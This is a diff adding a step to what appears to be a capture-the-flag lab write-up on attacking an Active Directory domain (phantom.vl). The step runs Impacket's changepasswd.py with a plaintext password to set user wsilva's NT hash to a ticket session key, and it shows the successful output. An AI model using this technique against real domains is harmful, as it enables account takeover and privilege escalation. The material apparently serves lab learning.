@@ -699,5 +699,15 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Then ill use this impacket script to get the ticket session key
 
+```python
+changepasswd.py -newhashes ':547507c1fd1b1c7312e896f082e209322361fc166d4d51446913a697fe2478ee' phantom.vl/wsilva:'Password123!'@dc.phantom.vl
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Changing the password of phantom.vl\wsilva
+[*] Connecting to DCE/RPC as phantom.vl\wsilva
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
+
+Then ill use that session key
 
